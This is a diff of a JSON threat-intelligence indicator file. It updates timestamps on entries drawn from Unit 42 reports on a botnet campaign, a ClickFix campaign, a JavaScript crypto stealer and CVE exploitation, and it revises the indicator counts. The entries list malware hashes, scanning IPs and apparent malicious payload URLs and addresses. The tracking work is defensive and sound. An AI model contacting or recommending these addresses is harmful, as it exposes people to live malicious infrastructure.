@@ -5654,7 +4682,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-19T13:44:18.434072+00:00",
+      "article_date": "2026-08-19T14:34:51.734897+00:00",
       "context": "1\r\n176.65.139.69\r\n176.65.139.59\r\n\r\nScanning IP (Examples):\r\n52.190.182.226\r\n20.169.94.182\r\n172.183.94.160\r\n135.232.224.1"
     },
     {
@@ -5663,7 +4691,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-19T13:44:18.434072+00:00",
+      "article_date": "2026-08-19T14:34:51.734897+00:00",
       "context": "\r\n176.65.139.59\r\n\r\nScanning IP (Examples):\r\n52.190.182.226\r\n20.169.94.182\r\n172.183.94.160\r\n135.232.224.163\r\n135.119.132."
     },
     {
@@ -5672,7 +4700,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-19T13:44:18.434072+00:00",
+      "article_date": "2026-08-19T14:34:51.734897+00:00",
       "context": "\r\n\r\nScanning IP (Examples):\r\n52.190.182.226\r\n20.169.94.182\r\n172.183.94.160\r\n135.232.224.163\r\n135.119.132.147\r\n40.76.181."
     },
     {
@@ -5681,7 +4709,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
-      "article_date": "2026-08-19T13:44:19.621290+00:00",
+      "article_date": "2026-08-19T14:34:52.986686+00:00",
       "context": "\n\r\n\r\nSHA256 HASHES FOR FIREFOXUPDATE.DLL (9 VARIANTS):\r\n\r\n- 1da7efbbdf7c49193f00716c23ffc6aa7bf95cf7a0592d043b87273deed4"
     },
     {
@@ -5690,7 +4718,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
-      "article_date": "2026-08-19T13:44:19.621290+00:00",
+      "article_date": "2026-08-19T14:34:52.986686+00:00",
       "context": "90255ff4fcd40253b49b6a3f1f327728bb8c98b8a040ecbef5118a5e\r\n- f9d378f5e6a0dbca15ae355190f58f66f2e33024a5216f9f0cc065f8c68a"
     },
     {
@@ -5699,7 +4727,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
-      "article_date": "2026-08-19T13:44:19.621290+00:00",
+      "article_date": "2026-08-19T14:34:52.986686+00:00",
       "context": "8a3cd0\r\n\r\nSHA256 HASHES FOR MOZGLUE.DLL (54 VARIANTS):\r\n\r\n- 0234f3afddedb16450e7f9c51ec55a3c935ce568806a7c1888aae048d44a"
     },
     {
@@ -5708,7 +4736,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
-      "article_date": "2026-08-19T13:44:19.621290+00:00",
+      "article_date": "2026-08-19T14:34:52.986686+00:00",
       "context": "a1afd6b803ab40c29308056d2cb70da3e15bbb7312bc1d9cfd6f33a0\r\n- fc15406249efda3972416625cebab46be623e6eb9c144f2a1ac13535cc2e"
     },
     {
@@ -5717,7 +4745,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-12-ClickFix-Campaign-Abuses-Mozilla-Firefox-Binary.txt",
-      "article_date": "2026-08-19T13:44:19.621290+00:00",
+      "article_date": "2026-08-19T14:34:52.986686+00:00",
       "context": "35cc2ee974\r\n\r\nSHA256 HASHES FOR XUL.DLL (56 VARIANTS):\r\n\r\n- 056a5cdabf72199382313b0966490d18b7d002ab1638c194a1325d9aaf7c"
     },
     {
@@ -5726,7 +4754,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-06-Obfuscated-JavaScript-Crypto-Stealer.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-06-Obfuscated-JavaScript-Crypto-Stealer.txt",
-      "article_date": "2026-08-19T13:44:20.211136+00:00",
+      "article_date": "2026-08-19T14:34:53.622047+00:00",
       "context": " document containing the malicious payload:         \r\n    - 6d585d11236277c42bf3666192f89733b1d5595967f6434a2e1b6c9d8584"
     },
     {
@@ -5735,7 +4763,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-06-Obfuscated-JavaScript-Crypto-Stealer.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-06-Obfuscated-JavaScript-Crypto-Stealer.txt",
-      "article_date": "2026-08-19T13:44:20.211136+00:00",
+      "article_date": "2026-08-19T14:34:53.622047+00:00",
       "context": "a2e1b6c9d8584a22c\r\n- SHA256 of the malicious payload\r\n    - f591ececf07aedf2f60dc9a362033b6f718799d5909ab38b6941a5296555"
     },
     {
@@ -5744,7 +4772,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-06-Obfuscated-JavaScript-Crypto-Stealer.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-06-Obfuscated-JavaScript-Crypto-Stealer.txt",
-      "article_date": "2026-08-19T13:44:20.211136+00:00",
+      "article_date": "2026-08-19T14:34:53.622047+00:00",
       "context": " payload)\r\n    - https://31.97.137.157:45000\r\n    - https://46.183.25.232:45000\r\n    - https://bet.slotgambit.com\r\n- URL"
     },
     {
@@ -5753,7 +4781,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
-      "article_date": "2026-08-19T13:44:20.820709+00:00",
+      "article_date": "2026-08-19T14:34:54.287354+00:00",
       "context": "\n2 RELATED SAMPLES (READ SHA256 HASH - FIRST SEEN DATE):\r\n\r\n55a1eb4c2d3da04376df39d7ba832569c6af1a37a0cf2b95f754ac898023"
     },
     {
@@ -5762,7 +4790,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
-      "article_date": "2026-08-19T13:44:20.820709+00:00",
+      "article_date": "2026-08-19T14:34:54.287354+00:00",
       "context": "HURSDAY): Hazy Scorpius Exploitation of CVE-2026-12569\r\n\r\nAUTHOR:\r\n\r\n- Matt Brady\r\n\r\nREFERENCE"
     },
     {
@@ -5771,7 +4799,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
-      "article_date": "2026-08-19T13:44:20.820709+00:00",
+      "article_date": "2026-08-19T14:34:54.287354+00:00",
       "context": "aloaltonetworks.com/threat-brief-moveit-cve-2023-34362/\r\n  -- https://www.cybereason.com/blog/"
     },
     {
@@ -5780,7 +4808,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
-      "article_date": "2026-08-19T13:44:20.820709+00:00",
+      "article_date": "2026-08-19T14:34:54.287354+00:00",
       "context": "/\r\n  -- https://www.cybereason.com/blog/cve-2024-55956-cleo-vulnerability\r\n- However, the grou"
     },
     {
@@ -5789,7 +4817,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-06-Hazy-Scorpius-Exploitation-of-CVE-2026-12569.txt",
-      "article_date": "2026-08-19T13:44:20.820709+00:00",
+      "article_date": "2026-08-19T14:34:54.287354+00:00",
       "context": "of its exploitation of a vulnerability (CVE-2025-61884) in Oracle’s E-Business Suite (EBS) sof"
     }
   ],
@@ -6347,19 +5375,18 @@
   ],
   "stats": {
     "total_structured": 355,
-    "total_extracted": 191,
-    "total": 546,
+    "total_extracted": 83,
+    "total": 438,
     "by_type": {
       "ip": 228,
       "url": 150,
-      "cve": 118,
       "sha256": 28,
       "md5": 21,
+      "cve": 10,
       "sha1": 1
     },
     "by_source": {
       "URLhaus": 150,
-      "SANS ISC": 108,
       "Emerging Threats": 100,
       "Binary Defense": 100,
       "Unit 42": 26,
